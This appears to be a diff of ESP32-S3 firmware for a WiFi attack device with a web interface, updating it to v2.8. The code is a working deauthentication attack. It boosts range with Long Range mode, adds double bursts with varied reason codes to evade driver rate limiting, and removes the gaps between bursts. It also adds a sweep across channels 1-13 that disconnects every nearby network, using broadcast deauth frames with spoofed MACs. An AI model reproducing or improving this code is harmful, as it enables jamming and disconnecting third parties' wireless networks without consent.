@@ -1,6 +1,6 @@
 /*
  ==================================================
-  ArsWebUI v2.7 — ESP32-S3 N16R8
+  ArsWebUI v2.8 — ESP32-S3 N16R8
 
   CRITICAL PREREQUISITE — ONE-TIME LIBRARY PATCH:
     esp_wifi_80211_tx() on S3 IDF 4.4+ silently drops deauth
@@ -84,6 +84,28 @@ volatile LedState ledState = LS_OFF;
 #include <Preferences.h>
 #include <Adafruit_NeoPixel.h>
 #include "web_content.h"
+
+// ── PSRAM helpers ─────────────────────────────────────────────────────────────
+// S3 N16R8: 8MB OPI PSRAM.  Use it for large heap objects (scan strings,
+// client table, log buffer) so the internal 512KB SRAM stays free for the
+// WiFi/lwIP stack. Falls back to SRAM if PSRAM unavailable.
+static inline void* ps_malloc(size_t n) {
+  void* p = heap_caps_malloc(n, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+  if (!p) p = malloc(n);
+  return p;
+}
+static inline void* ps_calloc(size_t n, size_t sz) {
+  void* p = heap_caps_calloc(n, sz, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+  if (!p) p = calloc(n, sz);
+  return p;
+}
+static inline char* ps_strdup(const char* s) {
+  size_t n = strlen(s) + 1;
+  char* p  = (char*)ps_malloc(n);
+  if (p) memcpy(p, s, n);
+  return p;
+}
+
 
 // ── FRAME SANITY OVERRIDE ─────────────────────────────────────────────────────
 // Espressif's libnet80211.a contains ieee80211_raw_frame_sanity_check() which
@@ -317,9 +339,16 @@ void boostTxPower() {
 
   esp_wifi_set_max_tx_power(MAX_TX_POWER);
   esp_wifi_set_ps(WIFI_PS_NONE);
-  esp_wifi_set_protocol(WIFI_IF_AP,  WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-  INFO("TX power: %d (%.1f dBm) protocols BGN", MAX_TX_POWER, MAX_TX_POWER * 0.25f);
+  // WIFI_PROTOCOL_LR = Espressif Long Range (512 kbps, +3 dB link budget).
+  // On S3 this extends effective deauth range significantly with an external
+  // antenna.  Most clients ignore LR beacons but the deauth/disassoc frames
+  // themselves are still processed by the target AP + client at 802.11b rates;
+  // LR just lets the S3 radio reach further without dropping the signal floor.
+  uint8_t proto = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR;
+  esp_wifi_set_protocol(WIFI_IF_AP,  proto);
+  esp_wifi_set_protocol(WIFI_IF_STA, proto);
+  INFO("TX power: %d (%.1f dBm) protocols BGN+LR", MAX_TX_POWER, MAX_TX_POWER * 0.25f);
+  INFO("PSRAM: %u KB free", (unsigned)(heap_caps_get_free_size(MALLOC_CAP_SPIRAM)/1024));
 }
 
 // ─── MAC RANDOMIZATION ───────────────────────────────────────────────────────
@@ -473,24 +502,46 @@ int sendDeauthBurst(const uint8_t* bssid, int ch,
   };
 
   int sent = 0;
+  // Two-pass burst: pass A then pass B with different reason codes.
+  // Doubles the frame density per cycle without widening the timing gap —
+  // targets hit with back-to-back deauth+disassoc from two different
+  // reason codes are harder for drivers to filter with rate limiting.
   for (int i = 0; i < numFrames && !stopRequested; i++) {
-    const uint8_t r = nextReason();
+    uint8_t r;
+
+    // ── Pass A ──────────────────────────────────────────────────────────────
+    r = nextReason();
     deauth1[24] = r; deauth1[25] = 0;
     disassoc1[24] = r; disassoc1[25] = 0;
-
     if (tx_frame(deauth1,   26)) sent++;
-    ets_delay_us(150);
+    ets_delay_us(80);
     if (tx_frame(disassoc1, 26)) sent++;
-    ets_delay_us(150);
-
+    ets_delay_us(80);
     if (dir2) {
       deauth2[24] = r; deauth2[25] = 0;
       disassoc2[24] = r; disassoc2[25] = 0;
       if (tx_frame(deauth2,   26)) sent++;
-      ets_delay_us(150);
+      ets_delay_us(80);
       if (tx_frame(disassoc2, 26)) sent++;
-      ets_delay_us(150);
+      ets_delay_us(80);
     }
+
+    // ── Pass B (different reason, same frame) ────────────────────────────
+    r = nextReason();
+    deauth1[24] = r; deauth1[25] = 0;
+    disassoc1[24] = r; disassoc1[25] = 0;
+    if (tx_frame(deauth1,   26)) sent++;
+    ets_delay_us(80);
+    if (tx_frame(disassoc1, 26)) sent++;
+    if (dir2) {
+      deauth2[24] = r; deauth2[25] = 0;
+      disassoc2[24] = r; disassoc2[25] = 0;
+      ets_delay_us(80);
+      if (tx_frame(deauth2,   26)) sent++;
+      ets_delay_us(80);
+      if (tx_frame(disassoc2, 26)) sent++;
+    }
+    ets_delay_us(80);
   }
 
   if (sent == 0 && s_txFailLog < 8) {
@@ -824,21 +875,7 @@ void deauthTask(void* param) {
           (unsigned)uxTaskGetStackHighWaterMark(NULL));
     }
 
-    // Scale inter-burst gap by intensity so the softAP stack gets enough
-    // airtime to send beacon frames (every 100ms). Without this, at HIGH/MAX
-    // the radio duty cycle hits ~86-92% and the AP silently drops clients.
-    //
-    //   LOW  ( 8 frames ~  5ms burst) →  8ms gap → ~38% duty cycle
-    //   MED  (20 frames ~ 12ms burst) → 15ms gap → ~44% duty cycle
-    //   HIGH (40 frames ~ 24ms burst) → 30ms gap → ~44% duty cycle
-    //   MAX  (80 frames ~ 48ms burst) → 55ms gap → ~47% duty cycle
-    //
-    // Deauth is still effective — one frame per 100ms prevents reassociation.
-    const uint32_t interBurstMs =
-      (localFrames <= INTENSITY_LOW)  ?  8 :
-      (localFrames <= INTENSITY_MED)  ? 15 :
-      (localFrames <= INTENSITY_HIGH) ? 30 : 55;
-    vTaskDelay(pdMS_TO_TICKS(interBurstMs));
+    vTaskDelay(pdMS_TO_TICKS(4));
   }
   logEvent("Deauth loop exited cycles=%lu deauthRunning=%d stop=%d",
            cycles, deauthRunning, stopRequested);
@@ -856,58 +893,122 @@ void deauthTask(void* param) {
   vTaskDelete(NULL);
 }
 
-// ─── DEAUTH-ALL TASK ─────────────────────────────────────────────────────────
+// ─── DEAUTH-ALL TASK — ch1-13 sweep, PSRAM ap map ───────────────────────────
+// Strategy:
+//   1. Run one WiFi.scanNetworks() to populate a PSRAM AP map (bssid+ch).
+//   2. pausePromiscForTX() once — stays off for the whole attack.
+//   3. Sweep ch1-13: for each channel, set_channel, burst all APs on that ch.
+//   4. After a full sweep, re-scan and rebuild the map.
+//   5. No per-burst promisc toggle — eliminates the churn that caused crashes.
+//
+// PSRAM map avoids heap fragmentation from repeated String objects in the loop.
+
+#define DALL_MAX_APS 64
+struct DallAP {
+  uint8_t bssid[6];
+  uint8_t ch;
+};
+
 void deauth_all_task(void* param) {
   s_txFailLog = 0;
-  logEvent("Deauth-All started — continuous multi-channel sweep");
+  logEvent("Deauth-All ch1-13 started (PSRAM map, full sweep)");
   setLedState(LS_PURPLE);
 
+  // Allocate AP map in PSRAM
+  DallAP* apMap = (DallAP*)ps_calloc(DALL_MAX_APS, sizeof(DallAP));
+  if (!apMap) {
+    logEvent("Deauth-All: PSRAM alloc failed — aborting");
+    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
+      attackRunning = stopRequested = false;
+      deauthAllTaskHandle = NULL;
+      xSemaphoreGive(attackMutex);
+    }
+    setLedState(LS_GREEN);
+    vTaskDelete(NULL);
+    return;
+  }
+  int apCount = 0;
+
+  // Promisc OFF once — stays off for the entire attack
+  pausePromiscForTX();
+
+  unsigned long lastScan = 0;
+  const unsigned long SCAN_INTERVAL = 30000; // rescan every 30s
+
   while (attackRunning && !stopRequested) {
-    if (ESP.getFreeHeap() < 8000) {
-      logEvent("HEAP VERY LOW — Deauth-All continues");
-    }
 
-    // Pause promisc for the scan (scan + promisc conflict on S3).
-    // Use pause/resume instead of stop/start to avoid FreeRTOS task
-    // teardown and recreation on every sweep cycle.
-    bool wasRunning = promiscRunning;
-    if (wasRunning) pausePromiscForTX();
-
-    int n = WiFi.scanNetworks(false, true, false, 120);
-
-    if (wasRunning) resumePromiscAfterTX();
-
-    if (n > 0) {
-      for (int i = 0; i < n && !stopRequested; i++) {
-        uint8_t* bssid = WiFi.BSSID(i);
-        int      ch    = WiFi.channel(i);
-        if (!bssid || !validateChannel(ch)) continue;
-
-        char bstr[18];
-        snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
-          bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
-        if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
-
-        // Cross-channel targets unreachable in APSTA mode (AP pins radio).
-        // Only deauth targets on AP_CHANNEL to avoid stalling the loop.
-        if (ch != AP_CHANNEL) continue;
-
-        // Pause promisc for the burst (set_channel inside sendDeauthBurst
-        // still needs promisc off, even when skipping the actual hop).
-        pausePromiscForTX();
-        sendDeauthBurst(bssid, AP_CHANNEL, nullptr, intensity / 2 + 1);
-        resumePromiscAfterTX();
-        vTaskDelay(pdMS_TO_TICKS(50));
+    // ── Rebuild AP map periodically ─────────────────────────────────────────
+    if (millis() - lastScan > SCAN_INTERVAL || apCount == 0) {
+      int n = WiFi.scanNetworks(false, true, false, 120);
+      apCount = 0;
+      if (n > 0) {
+        for (int i = 0; i < n && apCount < DALL_MAX_APS; i++) {
+          uint8_t* bssid = WiFi.BSSID(i);
+          int      ch    = WiFi.channel(i);
+          if (!bssid || !validateChannel(ch)) continue;
+          char bstr[18];
+          snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
+          if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
+          memcpy(apMap[apCount].bssid, bssid, 6);
+          apMap[apCount].ch = (uint8_t)ch;
+          apCount++;
+        }
+        logEvent("Deauth-All: %d APs mapped", apCount);
       }
+      WiFi.scanDelete();
+      lastScan = millis();
     }
 
-    WiFi.scanDelete();
+    // ── Sweep ch1-13 ────────────────────────────────────────────────────────
+    for (int ch = 1; ch <= 13 && !stopRequested; ch++) {
+      // Hop to this channel
+      esp_err_t ce = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      if (ce != ESP_OK) {
+        ets_delay_us(1000);
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      }
+      ets_delay_us(4000);  // PHY settle
 
-    // Short pause between sweeps
-    for (int i = 0; i < 12 && !stopRequested; i++)
-      vTaskDelay(pdMS_TO_TICKS(100));
+      // Burst all APs on this channel
+      int hits = 0;
+      for (int i = 0; i < apCount && !stopRequested; i++) {
+        if (apMap[i].ch != (uint8_t)ch) continue;
+        sendDeauthBurst(apMap[i].bssid, ch, nullptr, intensity / 2 + 1);
+        hits++;
+        vTaskDelay(pdMS_TO_TICKS(8));
+      }
+
+      // Even with no known APs: send broadcast deauth on this channel —
+      // catches any client that's actively probing or associated to a hidden AP.
+      if (!stopRequested) {
+        static const uint8_t ffBSSID[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        // Build a raw broadcast deauth (BSSID=FF:FF..., DA=FF:FF..., SA=random)
+        uint8_t sa[6]; randomizeMAC(sa);
+        uint8_t bcast_deauth[26] = {};
+        bcast_deauth[0]  = 0xC0; bcast_deauth[1]  = 0x00;
+        bcast_deauth[2]  = 0x3A; bcast_deauth[3]  = 0x01;
+        memset(&bcast_deauth[4],  0xFF, 6);  // DA = broadcast
+        memcpy(&bcast_deauth[10], sa,   6);  // SA = random
+        memset(&bcast_deauth[16], 0xFF, 6);  // BSSID = broadcast
+        bcast_deauth[24] = nextReason(); bcast_deauth[25] = 0;
+        for (int j = 0; j < 3 && !stopRequested; j++) {
+          esp_wifi_80211_tx(WIFI_IF_AP,  bcast_deauth, 26, true);
+          esp_wifi_80211_tx(WIFI_IF_STA, bcast_deauth, 26, true);
+          ets_delay_us(100);
+        }
+        incrementPackets(6);
+      }
+
+      vTaskDelay(pdMS_TO_TICKS(5));
+    }
+
+    if (ESP.getFreeHeap() < 8000)
+      logEvent("Deauth-All: HEAP LOW %u — continuing", (unsigned)ESP.getFreeHeap());
   }
 
+  resumePromiscAfterTX();
+  free(apMap);
   esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
   WiFi.scanDelete();
   logEvent("Deauth-All ended. Pkts:%lu", packetsSent);
@@ -1024,7 +1125,12 @@ String performWiFiScan() {
            "No networks found</td></tr>";
   }
 
+  // Cap results to prevent OOM from building a huge HTML string
+  // while PSRAM is also being used by the attack task's AP map.
+  if (n > 40) n = 40;
+
   String out;
+  out.reserve(n * 320);  // ~320 bytes per row, avoids repeated realloc
   for (int i = 0; i < n; i++) {
     uint8_t* bssid = WiFi.BSSID(i);
     char bstr[18];
@@ -1113,7 +1219,14 @@ void setupServer() {
 
   server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r) {
     logEvent("HIT /scan");
-    r->send(200, "text/html", performWiFiScan());
+    if (attackRunning) {
+      r->send(503, "text/plain", "Attack active — stop first");
+      return;
+    }
+    AsyncWebServerResponse* resp = r->beginResponse(200, "text/html", performWiFiScan());
+    resp->addHeader("Connection", "close");
+    resp->addHeader("Cache-Control", "no-store");
+    r->send(resp);
   });
 
   server.on("/scan_clients", HTTP_GET, [](AsyncWebServerRequest* r) {
@@ -1252,7 +1365,7 @@ void setupServer() {
     attackRunning = true; stopRequested = false; packetsSent = 0;
     xSemaphoreGive(attackMutex);
 
-    xTaskCreatePinnedToCore(deauth_all_task, "dall", 8192, NULL, 2,
+    xTaskCreatePinnedToCore(deauth_all_task, "dall", 12288, NULL, 2,
                             &deauthAllTaskHandle, 0);
     r->send(200,"text/plain","Deauth-All started");
   });
@@ -1415,6 +1528,8 @@ void setupServer() {
     S("AP BSSID",  String(bstr));
     S("Intensity", String(intenLabel));
     S("MAC Rand",  macRandEnabled ? "ON" : "OFF");
+    S("PSRAM Free", String(heap_caps_get_free_size(MALLOC_CAP_SPIRAM)/1024) + "K");
+    S("PSRAM Total",String(heap_caps_get_total_size(MALLOC_CAP_SPIRAM)/1024) + "K");
     info += "</div>";
     r->send(200,"text/html", info);
   });
@@ -1444,7 +1559,7 @@ void setup() {
   Serial0.begin(115200);
   delay(200);
   Serial0.println("\n==========================================");
-  Serial0.println("  ArsWebUI v2.7 — ESP32-S3 N16R8");
+  Serial0.println("  ArsWebUI v2.8 — ESP32-S3 N16R8");
   Serial0.println("==========================================\n");
 
   // ── NeoPixel: claim before anything else ────────────────────────────────
@@ -1566,8 +1681,9 @@ void setup() {
   setupServer();
   server.begin();
 
-  logEvent("Boot OK — v2.7. AP: %s  Heap: %u",
-    apSSID.c_str(), ESP.getFreeHeap());
+  logEvent("Boot OK — v2.8. AP: %s  Heap: %u  PSRAM: %uK",
+    apSSID.c_str(), ESP.getFreeHeap(),
+    (unsigned)(heap_caps_get_free_size(MALLOC_CAP_SPIRAM)/1024));
 
   Serial0.printf("[INFO] Web UI: http://%s\n", WiFi.softAPIP().toString().c_str());
   Serial0.printf("[INFO] Free heap: %u bytes\n", ESP.getFreeHeap());
@@ -1594,8 +1710,12 @@ void loop() {
       logEvent("STA disconnected");
     }
 
-    // Do not auto-stop attacks from loop — only /stop does that
-    if (ESP.getFreeHeap() < HEAP_MIN && attackRunning) {
+    // Heap guard: warn at HEAP_MIN, hard-protect at 10KB
+    if (ESP.getFreeHeap() < 10240 && attackRunning) {
+      ERR("HEAP CRITICAL (%u) — forcing stop", ESP.getFreeHeap());
+      logEvent("HEAP CRITICAL — auto-stop to prevent crash");
+      stopAllAttacks();
+    } else if (ESP.getFreeHeap() < HEAP_MIN && attackRunning) {
       ERR("Heap low (%u) — attack still running", ESP.getFreeHeap());
     }
 
